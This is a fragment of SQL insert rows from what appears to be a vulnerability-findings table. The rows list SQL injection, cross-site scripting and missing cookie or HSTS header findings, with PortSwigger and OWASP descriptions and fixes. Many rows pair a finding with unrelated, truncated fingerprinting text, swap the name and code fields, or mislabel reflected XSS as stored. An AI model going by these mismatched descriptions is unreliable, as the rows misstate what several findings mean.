(24, 'WSTG-INPV-05', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'SQL Injection', 61, 'high'),
(25, 'WSTG-INPV-05', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'SQL Injection', 62, 'Medium'),
(26, 'WSTG-INPV-01', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'Stored Cross Site Scriptng', 62, 'Low'),
(27, 'WSTG-SESS-02', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'Missing Secure Attribute in Cookie Header', 62, 'Low'),
(28, 'WSTG-SESS-02', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'Missing Expires Attribute in Cookie Header', 62, 'Low'),
(29, 'WSTG-SESS-02', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'Missing SameSite Attribute in Cookie Header', 62, 'Low'),
(30, 'WSTG-CONF-07', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'Missing HTTP Strict Transport Security Header', 62, 'Low'),
(31, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 63, 'High'),
(32, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 63, 'High'),
(33, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 63, 'High'),
(34, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 63, 'Low'),
(35, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 63, 'Low'),
(36, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 63, 'Low'),
(37, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 64, 'Medium'),
(38, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 64, 'High'),
(39, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 64, 'Low'),
(40, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 64, 'Medium'),
(41, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 64, 'Low'),
(42, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 64, 'Low'),
(43, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 65, 'High'),
(44, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 65, 'Medium'),
(45, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 65, 'Low'),
(46, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 65, 'Low'),
(49, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 66, 'High'),
(50, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 66, 'High'),
(51, 'Missing Secure Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 66, 'Low'),
(52, 'Missing Expires Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 66, 'Low'),
(53, 'Missing SameSite Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 66, 'Low'),
(54, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 66, 'Low'),
(55, 'Directory Traversal File Include', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', NULL, NULL, 'WSTG-ATHZ-01', 66, 'Low'),
(56, 'Missing HttpOnly Attribute in Cookie Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 66, 'Low'),
(57, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 66, 'Low'),
